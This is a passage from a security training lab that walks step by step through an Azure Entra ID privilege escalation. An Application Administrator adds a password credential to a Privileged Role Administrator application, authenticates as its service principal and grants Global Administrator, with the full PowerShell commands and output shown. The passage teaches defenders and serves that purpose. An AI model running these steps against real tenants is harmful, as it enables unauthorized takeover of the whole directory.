<p>We've demonstrated that most of this information could be obtained by a non-privileged user. The only information that we <strong>didn't</strong> demonstrate obtaining is the Application Administrator's password. However, we <strong>did</strong> demonstrate identifying the Application Administrator user, which would allow the attacker to target that user through other attacks including phishing and social engineering.</p>
</details>
</details>
<details class="example">
<summary>2. Create a new password credential for a PRA application</summary>
<h3 class="hidden_element" id="2-create-a-new-password-credential-for-a-pra-application">2. Create a new password credential for a PRA application</h3>
<p>Now let's start the privilege escalation attack!</p>
<p>First we'll login as the user assigned the Application Administrator role, which will then allow allow us to create a new password credential for the application assigned the PRA role.</p>
<ol>
<li>
<p>Execute the following commands to login as the Application Administrator.</p>
<p>Execute the following commands:</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>$SECURE_PASSWORD = ConvertTo-SecureString &quot;${PLAINTEXT_PASSWORD}&quot; -AsPlainText -Force
$CREDENTIAL = New-Object System.Management.Automation.PSCredential(${APP_ADMIN_UPN}, ${SECURE_PASSWORD})
Connect-AzureAD -Credential $CREDENTIAL
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $SECURE_PASSWORD = ConvertTo-SecureString &quot;${PLAINTEXT_PASSWORD}&quot; -AsPlainText -Force

PS /home/sec530-labs-azure-sec530-labs-xp&gt; $CREDENTIAL = New-Object System.Management.Automation.PSCredential(${APP_ADMIN_UPN}, ${SECURE_PASSWORD})

PS /home/sec530-labs-azure-sec530-labs-xp&gt; Connect-AzureAD -Credential $CREDENTIAL

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Why do these commands look familiar?</p>
<p>These commands are very similar to when we authenticated as a random non-privileged user in the <a href="../../a3/sec530.bonus.a3/#3-authenticate-to-azure" rel="noopener" target="_blank">Azure Manual Reconnaissance</a> lab. The only key difference is that we're now examining how an attacker or developer might escalate once they obtain access to an account assigned the Application Administrator role -- so we need to login with that account!</p>
</div>
</li>
<li>
<p>Our next step is to create a new password credential for the PRA application, so that we can authenticate with PRA privileges and manipulate other privileged roles.</p>
<p>Execute the commands below, leveraging the PRA application's object ID that we saved to a variable in <a href="#1-prepare-powershell-environment">task 1</a>, to create and then view the new credential.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>$PRA_APP_PT_CREDENTIAL=New-AzureADApplicationPasswordCredential -ObjectId ${PRA_APP_OBJECTID}
${PRA_APP_PT_CREDENTIAL}
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $PRA_APP_PT_CREDENTIAL=New-AzureADApplicationPasswordCredential -ObjectId ${PRA_APP_OBJECTID}
PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${PRA_APP_PT_CREDENTIAL}

CustomKeyIdentifier :
EndDate             : 9/20/2024 11:56:12 PM
KeyId               :
StartDate           : 9/20/2023 11:56:12 PM
<span class="hll">Value               : RSrI3VNtYLW1jB9yY7pQSD99/TUbG7QpPziq2nptWNs=
</span>
PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
<p>The ${PRA_APP_PT_CREDENTIAL}.Value property value is the new plaintext password!</p>
</li>
<li>
<p>Now that we have a credential that we think will let us authenticate as the PRA service principal, let's logout of the Microsoft Entra ID user assigned the Application Administrator role.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Disconnect-AzureAD
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Disconnect-AzureAD

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
</ol>
<div class="admonition success">
<p class="admonition-title">You have created a new password credential.</p>
<p>This completes the first part of our privilege escalation attack!</p>
</div>
</details>
<details class="example">
<summary>3. Login as the PRA Service Principal</summary>
<h3 class="hidden_element" id="3-login-as-the-pra-service-principal">3. Login as the PRA Service Principal</h3>
<p>Our next task is to login as the PRA service principal so that we can manage other privileged roles.</p>
<ol>
<li>
<p>Logging into Microsoft Entra ID with the new credential requires that we convert the plaintext password to a PowerShell SecureString and create a PowerShell Credential object. Execute the commands below to do so, and to display properties of the new Credential object.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>$PRA_APP_SECURESTRING=ConvertTo-SecureString $PRA_APP_PT_CREDENTIAL.Value -AsPlainText -Force
$PRA_APP_SECURE_CREDENTIAL=New-Object System.Management.Automation.PSCredential($PRA_APPID, $PRA_APP_SECURESTRING)
${PRA_APP_SECURE_CREDENTIAL} | Format-List
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $PRA_APP_SECURESTRING=ConvertTo-SecureString $PRA_APP_CREDENTIAL.Value -AsPlainText -Force

PS /home/sec530-labs-azure-sec530-labs-xp&gt; $PRA_APP_SECURE_CREDENTIAL=New-Object System.Management.Automation.PSCredential($PRA_APPID, $PRA_APP_SECURESTRING)

PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${PRA_APP_SECURE_CREDENTIAL} | Format-List

UserName : 90f89545-3f20-4d8e-8cd6-747b6f8e890b
Password : System.Security.SecureString

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
<p>Note that the ${PRA_APP_SECURE_CREDENTIAL}.UserName value is the same as the PRA AppId. You can quickly validate this with the following command:</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>${PRA_APP_SECURE_CREDENTIAL}.UserName -eq ${PRA_APPID}
</code></pre></div>
</div>
<p>Which will produce the following output, including the result of 'True':</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${PRA_APP_SECURE_CREDENTIAL}.UserName -eq ${PRA_APPID}
<span class="hll">True
</span>
PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
<li>
<p>Now that we have a secure Credential object, we can use it to authenticate to Microsoft Entra ID as the PRA service principal!</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Connect-AzAccount -Credential $PRA_APP_SECURE_CREDENTIAL -TenantId $TENANT_ID -ServicePrincipal
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Connect-AzAccount -Credential $PRA_APP_SECURE_CREDENTIAL -TenantId $TENANT_ID -ServicePrincipal
WARNING: The provided service principal secret or certifcate password will be included in the &#39;keystore.cache&#39; file found in the user profile ( /home/sec530-labs-azure-sec530-labs-xp/.Azure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
90f89545-3f20-4d8e-8cd6-747b6f8e890b                  f6edcda7-02bc-4daa-972d-15567f6e3bb6 AzureCloud

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
<p>The most important part of the command above is the <code>-ServicePrincipal</code> option, which tells PowerShell to authenticate as a service principal. There may be legitimate reasons for a user to manually login as a service principal but it can be dangerous! The PowerShell Connect-AzAccount cmdlet itself warns us of one of the risks:</p>
<blockquote>
<p>WARNING: The provided service principal secret or certifcate password will be included in the 'keystore.cache' file found in the user profile ( /home/sec530-labs-azure-sec530-labs-xp/.Azure ). Please ensure that this directory has appropriate protections.</p>
</blockquote>
</li>
</ol>
<div class="admonition success">
<p class="admonition-title">You have logged in as the PRA service principal.</p>
<p>This completes the second part of our privilege escalation attack!</p>
</div>
</details>
<details class="example">
<summary>4. Connect to Microsoft Entra ID with a New OAuth Token</summary>
<h3 class="hidden_element" id="4-connect-to-microsoft-entra-id-with-a-new-oauth-token">4. Connect to Microsoft Entra ID with a New OAuth Token</h3>
<p>Now that we are authenticated as the PRA Service Principal, we need to generate an OAuth token and use it to connect to Microsoft Entra ID. The OAuth access token will allow us to authenticate to Microsoft Entra ID using the Connect-AzureAD cmdlet. The Connect-AzureAD cmdlet allows us to use some Microsoft Entra ID (i.e., Active Directory) cmdlets that the Connect-AzAccount does not - some of which are essential to completing the privilege escalation.</p>
<ol>
<li>
<p>Execute the following command to establish the context for the OAuth token generation:</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>$CONTEXT = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile.DefaultContext
</code></pre></div>
</div>
<p>Now execute the following command to create a Microsoft Graph API token:</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>$AAD_TOKEN = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate(${CONTEXT}.Account, ${CONTEXT}.Environment, ${CONTEXT}.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, &quot;https://graph.windows.net&quot;).AccessToken
</code></pre></div>
</div>
<p>Your output should be:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $CONTEXT = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile.DefaultContext

PS /home/sec530-labs-azure-sec530-labs-xp&gt; $AAD_TOKEN = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate(${CONTEXT}.Account, ${CONTEXT}.Environment, ${CONTEXT}.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, &quot;https://graph.windows.net&quot;).AccessToken

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
<li>
<p>Using the new OAuth access token, connect to Microsoft Entra ID with the Connect-AzureAD cmdlet.</p>
<p>Execute the command below.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Connect-AzureAD -AadAccessToken ${AAD_TOKEN} -AccountId ${CONTEXT}.Account.Id -TenantId ${CONTEXT}.Tenant.Id
</code></pre></div>
</div>
<p>Your output should match the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Connect-AzureAD -AadAccessToken ${AAD_TOKEN} -AccountId ${CONTEXT}.Account.Id -TenantId ${CONTEXT}.Tenant.Id

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
</ol>
<div class="admonition success">
<p class="admonition-title">You authenticated using the ConnectAzure-Ad cmdlet, using a generated OAuth token.</p>
<p>This completes the third part of our privilege escalation attack!</p>
</div>
</details>
<details class="example">
<summary>5. Escalate Privileges to Global Administrator</summary>
<h3 class="hidden_element" id="5-escalate-privileges-to-global-administrator">5. Escalate Privileges to Global Administrator</h3>
<p>We're almost ready for the end objective: Escalating the Application Administrator to Global Administrator, giving complete control over the Microsoft Entra ID tenant!</p>
<p>However, there are a few more steps we need to complete...</p>
<ol>
<li>
<p>Escalating to Global Administrator requires that we have its object ID.</p>
<p>Execute the commands below to enumerate Global Administrators, save its object ID in a variable, and display the variable contents.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Get-AzureADDirectoryRole | ?{$_.DisplayName -eq &#39;Global Administrator&#39;} | select DisplayName, ObjectId,RoleTemplateId | Format-List
$GA_OBJECTID=(Get-AzureADDirectoryRole | ?{$_.DisplayName -eq &#39;Global Administrator&#39;}).ObjectId
${GA_OBJECTID}
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Get-AzureADDirectoryRole | ?{$_.DisplayName -eq &#39;Global Administrator&#39;} | select DisplayName, ObjectId,RoleTemplateId | Format-List

DisplayName    : Global Administrator
ObjectId       : 49c6994a-69bc-409e-bd73-7cfed841b9b5
RoleTemplateId : 62e90394-69f5-4237-9190-012177145e10

PS /home/sec530-labs-azure-sec530-labs-xp&gt; $GA_OBJECTID=(Get-AzureADDirectoryRole | ?{$_.DisplayName -eq &#39;Global Administrator&#39;}).ObjectId
PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${GA_OBJECTID}
49c6994a-69bc-409e-bd73-7cfed841b9b5

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
<li>
<p>We also need the object ID of the user account assigned the Application Administrator role, so that we can specify it as the object to receive Global Administrator privileges.</p>
<p>Execute the commands below to retrieve the user account, save its object ID in a variable, and display the contents of the variable.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Get-AzureADUser | ?{$_.userprincipalname -eq $APP_ADMIN_UPN} | Select-Object ObjectId,DisplayName,UserPrincipalName,UserType | Format-List
$APPADMIN_USER_OBJECTID=(Get-AzureADUser | ?{$_.userprincipalname -eq $APP_ADMIN_UPN}).ObjectId
${APPADMIN_USER_OBJECTID}
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Get-AzureADUser | ?{$_.userprincipalname -eq $APP_ADMIN_UPN} | Select-Object ObjectId,DisplayName,UserPrincipalName,UserType | Format-List

ObjectId          : be18b6ea-56dc-4d4f-861f-4a87158b8496
DisplayName       : Benjamin Waters
UserPrincipalName : benjaminwaters@sansdevstudent79e4d10cee7f.onmicrosoft.com
UserType          : Member

PS /home/sec530-labs-azure-sec530-labs-xp&gt; $APPADMIN_USER_OBJECTID=(Get-AzureADUser | ?{$_.userprincipalname -eq $APP_ADMIN_UPN}).ObjectId

PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${APPADMIN_USER_OBJECTID}
be18b6ea-56dc-4d4f-861f-4a87158b8496

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
<details class="tip">
<summary>Workbook Validation</summary>
<p>You can validate the retrieved object ID by examining the 'Application Admin User ObjectId' value saved in the Azure-Notes workbook.</p>
</details>
</li>
<li>
<p>We can also use the Global Administrator object ID to enumerate the current holders of the role. Let's do that before we attempt the privilege escalation, so that after the attempt we can validate whether it was successful.</p>
<p>Execute the command below.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Get-AzureADDirectoryRoleMember -ObjectId ${GA_OBJECTID} | select Objectid,DisplayName
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Get-AzureADDirectoryRoleMember -ObjectId ${GA_OBJECTID} | select Objectid,DisplayName
ObjectId                             DisplayName
--------                             -----------
4167bde7-e57d-46e8-af0a-0a2bad765de3 sec530-labs-azure-sec530-labs-xphsi
7d9cb69f-e89c-42d3-8db4-dae0e6252781 sansdevstudent79e4d10cee7f.onmicrosoft.com ITOps-App

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
<div class="admonition important">
<p class="admonition-title">Your output will be different but you should see that the user assigned the Application Administrator role is <em>not</em> also assigned the Global Administrator role!</p>
</div>
</li>
<li>
<p>Finally: Time for privilege escalation!</p>
<p>We'll accomplish this with the Add-AzureADDirectoryRoleMember cmdlet, using the access we've established with the OAuth access token and the referencing the object IDs of the Global Administrator role and the user assigned the Application Administrator role.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Add-AzureADDirectoryRoleMember -RefObjectId ${APPADMIN_USER_OBJECTID} -ObjectId ${GA_OBJECTID}
</code></pre></div>
</div>
<p>Your output should match the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Add-AzureADDirectoryRoleMember -RefObjectId ${APPADMIN_USER_OBJECTID} -ObjectId ${GA_OBJECTID}

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
<li>
<p>The command successfully executed, but we can't declare success until we've validated that the user assigned the Application Administrator role is now also assigned the Global Administrator role!</p>
<p>Execute the command below to enumerate the current holders of the Global Administrator role.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>Get-AzureADDirectoryRoleMember -ObjectId ${GA_OBJECTID} | select Objectid,DisplayName
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; Get-AzureADDirectoryRoleMember -ObjectId ${GA_OBJECTID} | select Objectid,DisplayName
ObjectId                             DisplayName
--------                             -----------
65ce279e-40aa-44d3-907d-925b16873f23 admin@sansranges.onmicrosoft.com Glicksman
078e18ee-ab20-477d-ba40-ec757391d106 Odin Account Management (dev)
4167bde7-e57d-46e8-af0a-0a2bad765de3 sec530-labs-azure-sec530-labs-xphsi
be18b6ea-56dc-4d4f-861f-4a87158b8496 Benjamin Waters
7d9cb69f-e89c-42d3-8db4-dae0e6252781 sansdevstudent79e4d10cee7f.onmicrosoft.com ITOps-App

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
<div class="admonition important">
<p class="admonition-title">Your output will be different but you should see that the user assigned the Application Administrator role now <em>is</em> also assigned the Global Administrator role!</p>
</div>
</li>
</ol>
<div class="admonition success">
<p class="admonition-title">Congratulations! You have successfully elevated privileges to Global Administrator!</p>
</div>
</details>
<h2 id="conclusion">Conclusion</h2>
<p>Nice work! You have successfully demonstrated that privilege escalation is possible within the Tyrell Corp Microsoft Entra ID environment, all the way up to Global Administrator and complete control over the tenant!</p>
<p>An attacker could:</p>
<ol>
<li>Leverage non-privileged access to enumerate details of the Microsoft Entra ID environment, including users assigned the Application Administrator role and applications assigned the Privileged Role Administrator (role).</li>
<li>Target the Application Administrator - for example, through other attacks including phishing and social engineering.</li>
<li>After obtaining access as an Application Administrator, add new password credentials to any application's service principal, including those assigned the Privileged Role Administrator (PRA) role.</li>
<li>Use the new credentials to interactively authenticate as the PRA application's service principal.</li>
<li>Use the PRA privileges to assign themselves (or any other user!) the Global Administrator role!</li>
</ol>
<p>In addition to the attack path that these labs illustrated, there is another glaring security hole in the environment. Since the Global Administrator role is assigned to an Azure application, the attacker could use the Application Administrator role to create a new password credential for <strong>that</strong> application's service principal and login as that service principal. This could give the attacker the Global Administrator role without having to either (a) obtain the PRA role or (b) add the Global Administrator role to any new users or objects.</p>
<p>Hopefully the Tyrell Corp CISO has enough information to successfully lobby for tighter controls on  development and change control!</p>
<p>But you're not done quite yet! The <a href="../../a5/sec530.bonus.a5/" rel="noopener" target="_blank">final lab</a> walks through tearing down the test environment.</p>












                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../../a3/sec530.bonus.a3/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Manual Reconnaissance">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                Manual Reconnaissance
              </div>
            </div>
          </a>
        
        
          
          <a href="../../a5/sec530.bonus.a5/" class="md-footer__link md-footer__link--next" aria-label="Next: Teardown">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                Teardown
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      ©2024 Greg Scheidel
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.tabs.link", "content.code.annotation", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.instant", "navigation.instant.progress", "navigation.tabs", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.5cfa9459.min.js"></script>
      
    
  </body>
</html>